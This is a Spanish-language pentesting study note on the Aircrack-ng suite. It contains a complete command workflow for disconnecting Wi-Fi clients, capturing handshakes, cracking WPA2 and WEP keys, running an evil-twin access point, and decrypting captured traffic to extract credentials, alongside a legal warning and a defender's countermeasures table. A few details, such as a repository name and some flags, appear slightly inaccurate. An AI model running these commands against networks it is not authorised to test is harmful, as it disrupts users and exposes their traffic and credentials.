---
tags:
  - ciberseguridad
  - herramientas
  - aircrack-ng-suite
tipo: herramienta
estado: terminado
---

# Aircrack-ng: Suite de Herramientas para Auditoría Inalámbrica

**Aircrack-ng** es la suite completa de auditoría Wi-Fi: captura en modo monitor, enumeración de redes, generación de tráfico (inyección) y recuperación de claves WEP/WPA/WPA2. No es una herramienta sino **siete binarios encadenados** que cubren el ciclo completo *descubrir → capturar → inyectar → crackear → desencriptar*. Es el estándar de facto en CTF inalámbricos y en la fase de reconocimiento Wi-Fi de cualquier pentest (ver [[Hacking WiFi Fundamentos y Ataques]]).

> [!info] Por qué existe Aircrack-ng
> El Wi-Fi cifrado no se "rompe" por la red: se rompe **capturando material criptográfico y trabajando offline**. WEP se rompe por la debilidad de RC4 + reutilización de IVs (acumulables); WPA2-PSK se rompe con un ataque de diccionario sobre el *handshake* de 4 vías (PMKID/4-way). Aircrack-ng produce ese material: pone la tarjeta en modo monitor, escucha, fuerza reconexiones para capturar el handshake y luego ataca la clave **sin tocar más la red**. Por eso su fase de crackeo es silenciosa por definición.

## Matriz de la suite: qué binario hace qué

| Binario | Función | Momento de uso |
|---|---|---|
| `airmon-ng` | Gestiona interfaces: activa/detiene modo monitor, mata procesos que molestan | Paso 0, siempre |
| `airodump-ng` | Escucha y **captura**: lista redes, clientes, y escribe el `.cap` | Descubrimiento + captura |
| `aireplay-ng` | **Inyección**: deauth, fake auth, ARP replay, fragmentación | Forzar handshake / generar IVs |
| `aircrack-ng` | **Crackeo offline** de WEP y WPA/WPA2-PSK | Una vez tienes el `.cap` |
| `airbase-ng` | Evil twin: AP software que suplanta a una red | Capturar handshakes sin clientes activos |
| `airdecap-ng` | **Desencripta** un `.cap` con la clave ya conocida | Post-explotación / forense |
| `airdecloak-ng` | Elimina paquetes forjados/inyectados de una captura | Limpiar capturas ruidosas |
| `airgraph-ng` | Grafo cliente↔AP↔sonda a partir del CSV de airodump | Visualizar relaciones |
| `packetforge-ng` | Forja paquetes inyectables a partir de una captura | Preparar reinyección WEP |

## Instalación

```bash
# Kali Linux (incluido por defecto)
sudo apt update && sudo apt install aircrack-ng

# Verificar instalación y compatibilidad de la tarjeta
aircrack-ng --help
sudo airmon-ng check
```

**Requisitos duros:**

1. **Tarjeta con modo monitor + inyección**: no toda tarjeta lo soporta (ver [[Hacking Wi-Fi Tarjetas de Red]] — chipsets Atheros/ath9k, Ralink rt2800usb y Alfa AWUS036ACH son los fiables).
2. **Root**: capturar e inyectar requiere raw sockets y control de la interfaz.
3. **Procesos apagados**: NetworkManager, wpa_supplicant y dhcpcd pelean por la interfaz.

> [!warning] RF-kill y drivers
> Si la radio está bloqueada por hardware/teclado (`rfkill`), `airmon-ng` falla con `Operation not possible due to RF-kill`. Solución: `rfkill unblock all` antes de empezar.

## Conceptos mínimos que usa la suite

| Término | Significado |
|---|---|
| **BSSID** | MAC del punto de acceso (identificador físico) |
| **ESSID** | Nombre de la red visible por el usuario |
| **CH** | Canal (1-13 en 2.4 GHz, 36-165 en 5 GHz) — todo ocurre **en un canal** |
| **IV** | *Initialization Vector* reutilizado en WEP: es "el combustible" del crackeo WEP |
| **Handshake de 4 vías** | Mensajes EAPOL que prueban que cliente y AP conocen la PMK; contienen material para atacar la clave offline |
| **PMKID** | Derivado PMK–AP presente en la 1ª trama del handshake: permite atacar sin cliente conectado (con `hcxpcapngtool`, no con aircrack-ng clásico) |
| **Modo monitor** | La interfaz escucha **todo** el tráfico del canal, sin asociarse |
| **PMF (802.11w)** | *Protected Management Frames*: autentica los frames de desautenticación y **bloquea el ataque `-0`** |

## Flujo completo: descubrimiento → crackeo

### Paso 0 — Modo monitor

```bash
# Matar procesos que expulsan a la tarjeta del modo monitor
sudo airmon-ng check kill

# Activar modo monitor (crea wlan0mon o mon0 según el driver)
sudo airmon-ng start wlan0

# Confirmar que existe y en qué canal está
iw dev
iwconfig wlan0mon
```

> [!tip] Comprobación de inyección
> Antes de cualquier ataque, verifica que la tarjeta **inyecta**: `sudo aireplay-ng -9 wlan0mon` (test de inyección: envía probes y espera respuesta). Si da `No answer...` o `Ping failed`, el ataque inyectado nunca funcionará — arregla el driver antes de seguir.

### Paso 1 — Descubrimiento y captura (airodump-ng)

```bash
# Barrido inicial: todas las redes visibles, salta de canal en canal
sudo airodump-ng wlan0mon

# Fijarse en un objetivo: canal 6, BSSID 00:11:22:33:44:55, escribe captura-01.cap
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan0mon
```

**Interpretación de la tabla superior (redes):**

| Columna | Significado | Qué mirar |
|---|---|---|
| `BSSID` | MAC del AP | El objetivo |
| `PWR` | Potencia de señal (dBm negativo o índice) | Mejor que −60 para atacar |
| `Beacons` | Beacons recibidos | AP vivo y hablando |
| `#Data` | Paquetes de datos (≈ IVs en WEP) | **La métrica del crackeo WEP** |
| `#/s` | Datos/segundo | Ritmo de acumulación |
| `CH` | Canal | Para fijarlo con `-c` |
| `MB` | Máx. throughput/estándar (54 = 802.11g, 150/300 = n) | — |
| `ENC` | Cifrado: `WPA2`, `WPA`, `WEP`, `OPN` | `OPN` = abierto, `WEP` = crackable rápido |
| `CIPHER` | `CCMP` (AES), `TKIP`, `WEP` | — |
| `AUTH` | `PSK`, `MGT`, `OPN` | `MGT` = 802.1X (enterprise: fuera del alcance de aircrack) |
| `ESSID` | Nombre de red | — |

**Interpretación de la tabla inferior (estaciones):**

| Columna | Significado |
|---|---|
| `STATION` | MAC del cliente |
| `BSSID` | AP al que está asociado (o `(not associated)` = sondeando: sirve para ataques dirigidos) |
| `PWR` | Potencia del cliente |
| `Rate` | Velocidad de la conexión |
| `Lost` | Paquetes perdidos (↑ = mala señal) |
| `Probe` | SSIDs que el cliente está sondeando (revela redes que ha visitado) |

```bash
# Guardar solo lo que importa y acelerar: formato pcap + CSV
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 --output-format pcap,csv -w captura wlan0mon
```

### Paso 2 — Generar tráfico (aireplay-ng)

Un handshake solo aparece cuando un cliente (se) asocia. Para no esperar: se expulsa al cliente y se captura su reconexión.

```bash
# Deauth (5 tramas) al AP → obliga a reconectar → cae el handshake en captura-01.cap
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# Dirigido a un solo cliente (mucho menos ruido)
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

| Modo `aireplay` | Flag | Uso | Notas |
|---|---|---|---|
| Deautenticación | `-0 <count>` | Forzar reconexión → capturar handshake | `-0 0` = deauth continuo |
| Autenticación falsa | `-1 <count>` | Asociarse al AP sin cliente | Necesario para inyectar en WEP (`-e ESSID -a BSSID -h MAC`) |
| Sesión interactiva | `-2` | Reinyección interactiva con el AP | — |
| ARP replay | `-3` | Reinyectar ARP → el AP re-emite con **IVs nuevos** | El clásico de WEP |
| Chopchop | `-4` | Descifrar trama WEP sin clave | — |
| Fragmentación | `-5` | Recuperar clave de fragmentos (base de PTW) | — |
| Test de inyección | `-6` | Comprobar que la tarjeta inyecta | Diagnóstico |

> [!warning] Deautenticar es intrusivo y está penalizado
> `-0` genera tramas de control que desconectan usuarios reales. En redes ajenas es ilegal (LSSI/LOPDGDD y equivalents). Con **PMF activo** (`802.11w`), los frames de deauth se ignoran: el ataque `-0` simplemente no funciona. En redes modernas, la vía es esperar una reconexión natural o usar PMKID.

### Paso 3 — Crackear

**WPA2-PSK (lo común):**

```bash
sudo aircrack-ng -a2 -b 00:11:22:33:44:55 -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

```bash
# Varias capturas a la vez (merge) — acumula handshakes
sudo aircrack-ng -a2 -b 00:11:22:33:44:55 -w rockyou.txt *.cap

# Extraer todas las claves PMK/PMKID para hashcat/john (hcxtools)
hcxpcapngtool -o hash.22000 captura-01.cap
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

**WEP (legacy, pero rápido si hay IVs):**

```bash
# 1. Generar IVs: fakeauth + ARP replay en paralelo
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 -e RedObjetivo -h AA:BB:CC:DD:EE:FF wlan0mon   # asociar
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon                     # ARP replay

# 2. Esperar a que #Data supere ~40k (WEP-64) / ~500k (WEP-128) y crackear
sudo aircrack-ng -a1 -b 00:11:22:33:44:55 -n 128 captura-01.cap
```

**Interpretación del crackeo WPA2:** aircrack muestra `KEY FOUND! [ password ]` cuando un candidato reproduce el MIC de la trama EAPOL — la clave existe en el handshake, no se "rompe el AES".

**Interpretación del progreso WEP:** `Recovered IVs: 120345 (46% )` → porcentaje hacia el número de IVs estadísticamente necesarios. No hay "fallo": si no encuentra la clave, faltan IVs o el diccionario no la contiene.

### Paso 4 — Desencriptar con la clave (airdecap-ng)

```bash
# WPA/WPA2: la clave pass-phrase por passphrase
sudo airdecap-ng -p 'MiClaveWifi123' -b 00:11:22:33:44:55 captura-01.cap

# WEP: clave en HEXADECIMAL (no es un fichero de texto)
sudo airdecap-ng -w 0102030405060708090a0b0c0d -b 00:11:22:33:44:55 captura-01.cap
```

Genera `captura-01-dec.cap` con el tráfico en claro → ábrelo con [[Wireshark y Tshark]] para extraer credenciales, cookies o tokens transmitidos tras la conexión.

> [!warning] Corrección respecto a notas previas
> - `airdecap-ng -w` recibe **la clave WEP en hex**, no un fichero. Un passphrase WPA va con `-p`.
> - `aircrack-ng -n` define la **longitud de clave en bits** (64/128/256…), no un número de paquetes.
> - `aircrack-ng -K` ejecuta **solo los ataques Korek** (WEP), no PTW.
> - Los modos de `aireplay-ng` son `-0` deauth, `-1` fakeauth, `-2` interactiva, `-3` ARP replay, `-4` chopchop, `-5` fragmentación, `-6` test.

## Referencia de flags por binario

### airmon-ng

| Flag | Significado | Ejemplo |
|---|---|---|
| `start <if>` | Crea interfaz en modo monitor | `airmon-ng start wlan0` |
| `stop <if>` | Elimina la interfaz monitor y restaura | `airmon-ng stop wlan0mon` |
| `check [kill]` | Lista procesos que molestan; `kill` los termina | `airmon-ng check kill` |
| (sin args) | Tabla de interfaces + chipsets detectados | `airmon-ng` |

### airodump-ng

| Flag | Significado | Ejemplo |
|---|---|---|
| `-c <canal>` | Fijar canal (o lista `1,6,11`, o rango `1-13`) | `airodump-ng -c 6 wlan0mon` |
| `--bssid <mac>` | Filtrar/aislar un AP | `--bssid 00:11:22:33:44:55` |
| `-w <prefijo>` | Escribe `<prefijo>-01.cap/.csv/.kismet.csv` | `-w captura` |
| `--output-format <fmt>` | `pcap`, `csv`, `kismet`, `netxml` (lista) | `--output-format pcap,csv` |
| `--write-interval <s>` | Cada cuántos segundos vuelca a disco | `--write-interval 10` |
| `--manufacturer` | Resuelve fabricante desde OUI | — |
| `--wps` | Muestra información WPS (si la hay) | — |
| `--encrypt <n>` | Filtra por cifrado (`1` WEP, `2` WPA…) | — |
| `--essid <nombre>` | Filtra por ESSID | `--essid "MiRed"` |
| `-I <ms>` | Intervalo de actualización de pantalla | `-I 100` |
| `--show-intf` / `-I` | Ver notas de interfaz | — |
| `-5 / --ht` | Tráfico 5 GHz | — |

### aireplay-ng (solo inyección)

| Flag | Significado | Ejemplo |
|---|---|---|
| `-0 <n>` | Enviar *n* deauths (0 = infinito) | `aireplay-ng -0 10 -a <bssid> wlan0mon` |
| `-1 <n>` | Fake authentication con el AP | `-1 0 -e Red -a <bssid> -h <mac>` |
| `-3` | ARP replay (generación de IVs WEP) | `-3 -b <bssid> -h <mac> wlan0mon` |
| `-a <bssid>` | BSSID del AP | `-a 00:11:22:33:44:55` |
| `-c <mac>` | Cliente objetivo (solo a ese) | `-c AA:BB:CC:DD:EE:FF` |
| `-e <essid>` | ESSID para fakeauth | `-e RedObjetivo` |
| `-h <mac>` | MAC de origen (spoof, tu MAC) | `-h AA:BB:CC:DD:EE:FF` |
| `-q` | Silencioso (solo imprime estadísticas) | — |
| `-9` | Test de inyección | `aireplay-ng -9 wlan0mon` |

### aircrack-ng (crackeo)

| Flag | Significado | Ejemplo |
|---|---|---|
| `-a <1\|2>` | 1 = WEP, 2 = WPA/WPA2-PSK | `-a2` |
| `-b <bssid>` | BSSID objetivo (filtra el `.cap`) | `-b 00:11:22:33:44:55` |
| `-e <essid>` | Por ESSID en vez de BSSID | `-e RedObjetivo` |
| `-w <archivo>` | Wordlist (varios `-w` = concatenados) | `-w rockyou.txt` |
| `-n <bits>` | Longitud clave WEP (64/128/256…) | `-n 128` |
| `-C <macs>` | Merge de varias redes (PTW combinado) | — |
| `-K` | Solo ataques Korek (WEP) | `-K` |
| `-l <archivo>` | Escribe la clave encontrada a fichero | `-l clave.txt` |
| `-q` | Modo quiet (solo resultados) | `-q` |

### airdecap-ng / airdecloak-ng

| Flag (airdecap) | Significado | Ejemplo |
|---|---|---|
| `-p <passphrase>` | Clave WPA/WPA2 | `-p 'MiClave123'` |
| `-w <hex>` | Clave WEP en hexadecimal | `-w 01020304...` |
| `-b <bssid>` | BSSID del AP | — |
| `-e <essid>` | ESSID | — |
| `-s` | **Guardar** paquetes descifrados (por defecto descarta los no dirigidos) | `-s` |

| Flag (airdecloak) | Significado |
|---|---|
| `--bssid <mac>` | BSSID a limpiar |
| `-i <entrada>` / `-o <salida>` | Captura de entrada / limpia de salida |
| `--ppsm` / `--ifu` | Ajustes de umbral de "paquete forjado" |

## Recetas: los 10 comandos que se escriben de verdad

```bash
# 1. Preparar entorno (una vez por sesión)
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# 2. Descubrir redes y apuntar canal + BSSID del objetivo
sudo airodump-ng wlan0mon

# 3. Escuchar SOLO el objetivo y empezar a grabar
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan0mon

# 4. (en otra terminal) Forzar reconexión y capturar el handshake
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon

# 5. Verificar que el handshake cayó (aparece "WPA (1 handshake)")
sudo aircrack-ng captura-01.cap

# 6. Crackear con diccionario
sudo aircrack-ng -a2 -b 00:11:22:33:44:55 -w /usr/share/wordlists/rockyou.txt captura-01.cap

# 7. (WEP) Fakeauth + ARP replay para acumular IVs
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 -e Red -h AA:BB:CC:DD:EE:FF wlan0mon
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# 8. Crackear WEP cuando #Data es suficiente
sudo aircrack-ng -a1 -b 00:11:22:33:44:55 -n 128 captura-01.cap

# 9. Pasar a hashcat para GPU (WPA2)
hcxpcapngtool -o hash.22000 captura-01.cap && hashcat -m 22000 hash.22000 rockyou.txt

# 10. Restaurar la interfaz al finalizar
sudo airmon-ng stop wlan0mon && sudo service NetworkManager start
```

**Qué hace cada flag de la receta 3:** `-c 6` deja de saltar de canal (si saltas, pierdes el handshake), `--bssid` filtra el tráfico guardado a ese AP (capturas 10× más limpias), `-w captura` nombra los ficheros `captura-01.cap`.

## Detección y contramedidas (defensor)

| Acción ofensiva | Cómo se ve | Contramedida |
|---|---|---|
| Modo monitor | Interfaz `wlan0mon` en `ip a`; monitor mode detectable por WIDS | Control físico/EDR; revisar `iw dev` en endpoint |
| Barrido airodump (pasivo) | Prácticamente **invisible**: solo escucha | Pocas defensas; segmentación/VPN |
| Deauth (`-0`) | Flood de frames de management sin asociación → **alerta clásica de WIPS** (Kismet, Cisco WIPS, OpenWIDS) | **802.11w/PMF** obligatorio: los deauth forjados se descartan |
| Evil twin (`airbase-ng`) | BSSID nuevo con SSID conocido, DHCP diferente, clientes que "se caen y vuelven" | Detección de rogue AP, EAP-LeAP/802.1X, network access control |
| Crackeo offline | Silencioso: cero tráfico de red | **No hay detección directa**: solo se mitiga con claves largas (≥14 chars, aleatorias) y WPA3/SAE |
| WEP | Volumen de `#Data` anómalo + ARP replay visible en WIDS | WEP está obsoleto: retirarlo |

> [!tip] Regla de defensa que resume la ofensiva
> Con WPA2 + PMF + passphrase de 16+ caracteres aleatorios, la ventana ofensiva real de esta suite es **el handshake capturado durante el provisioning inicial o un cliente que ignore PMF**. El crackeo es computacionalmente inviable: por eso WPA3/SAE existe.

## Errores comunes (mensaje exacto → causa → arreglo)

1. **`airmon-ng check` → `NetworkManager` / `wpa_supplicant` / `dhcpcd`** — matan el modo monitor al rato.
   → `sudo airmon-ng check kill` (recuerda reiniciar NetworkManager al terminar).
2. **`ioctl(SIOCSIWMODE) failed: Operation not possible due to RF-kill`** — radio bloqueada.
   → `rfkill unblock all` y reintentar.
3. **`No such device` / `wlan0mon` no aparece** — la interfaz no soporta monitor o el driver no la crea.
   → `iw list | grep -A10 "monitor"` (si no aparece *Supported interface modes: monitor*, la tarjeta/driver no sirve; ver [[Hacking Wi-Fi Tarjetas de Red]]).
4. **`Fixed channel -1` / el canal salta** — airodump no puede fijar canal porque otro proceso (NetworkManager) la mueve.
   → `airmon-ng check kill` + fijar con `iwconfig wlan0mon channel 6`.
5. **`Please specify a valid --bssid`** — BSSID mal escrito o `--bssid` sin `-c`.
   → Pasar siempre ambos: `-c <canal> --bssid <mac>`.
6. **`No valid WPA handshakes found`** / aircrack no ve handshake — no llegó la trama completa, o la captura empezó tarde.
   → Deauth más agresivo (`-0 0` por unos segundos) y confirmar en la cabecera de aircrack `WPA (1 handshake)`.
7. **`Not enough encrypted packets` (WEP)** — faltan IVs.
   → Seguir con `-3` ARP replay hasta ~40k (64-bit) / ~500k+ (128-bit) en `#Data`.
8. **`Associated...` pero `#Data` no sube** — fakeauth sin tráfico real.
   → Generar tráfico: ARP replay o ping desde otro host de la red.
9. **`airdecap-ng: Unsupported/unknown encryption`** — BSSID o clave equivocada.
   → Revisar `-b` y usar hex con `-w` para WEP (¡no una ruta de fichero!).
10. **Después de `check kill`, no hay red** — esperado: NetworkManager quedó muerto.
    → `sudo service NetworkManager start` al terminar la auditoría.

## Cheatsheet — los 10 comandos del día a día

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan0mon
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
sudo aireplay-ng -9 wlan0mon
sudo aircrack-ng -a2 -b 00:11:22:33:44:55 -w /usr/share/wordlists/rockyou.txt captura-01.cap
sudo aircrack-ng -a1 -b 00:11:22:33:44:55 -n 128 captura-01.cap
sudo airdecap-ng -p 'clave' -b 00:11:22:33:44:55 captura-01.cap
sudo airmon-ng stop wlan0mon
```

| Tarea | Comando |
|---|---|
| Ver todas las redes | `sudo airodump-ng wlan0mon` |
| Capturar de un AP | `airodump-ng -c <ch> --bssid <mac> -w x wlan0mon` |
| Forzar handshake | `aireplay-ng -0 10 -a <bssid> wlan0mon` |
| Crack WPA2 | `aircrack-ng -a2 -b <bssid> -w rockyou.txt x-01.cap` |
| Crack WEP | `aircrack-ng -a1 -b <bssid> -n 128 x-01.cap` |
| Test inyección | `aireplay-ng -9 wlan0mon` |
| Desencriptar | `airdecap-ng -p 'clave' x-01.cap` |
| Para hashcat | `hcxpcapngtool -o h.22000 x-01.cap` |
| Evil twin | `airbase-ng -e "Free" -c 6 wlan0mon` |
| Restaurar | `airmon-ng stop wlan0mon && service NetworkManager start` |

## Referencias

- [Sitio oficial de Aircrack-ng](https://www.aircrack-ng.org/) — documentación, man pages y guías de soporte de tarjetas
- [Repositorio GitHub](https://github.com/aircrack-ng/aircrack-ng)
- [hcxtools](https://github.com/ZerBeek/hcxtools) — `hcxpcapngtool` para convertir capturas a PMKID/22000
- HackTricks — *Wireless Attacks* para el flujo completo en CTF
- GTFOBins no aplica (no binario con binarios locales explotables), pero su antecedente conceptual es la abuso de [[Privilegios SUID en Linux]] cuando la suite corre con `sudo`.

## Relacionadas

- [[Hacking WiFi Fundamentos y Ataques]] — teoría de ataques, WPA3/SAE, PMF
- [[Hacking Wi-Fi Tarjetas de Red]] — qué chipset comprar para que esto funcione
- [[MDK3 Herramienta de Auditoría Inalámbrica]] — floods y ataques que aircrack no hace (beacon flood, auth flood)
- [[Wireshark y Tshark]] / [[Tshark]] — análisis de los `.cap` producidos
- [[Tcpreplay]] — reinyección de capturas para laboratorio
- [[Reconocimiento y Escaneo de Redes y Web]] — dónde encaja el Wi-Fi dentro del reconocimiento
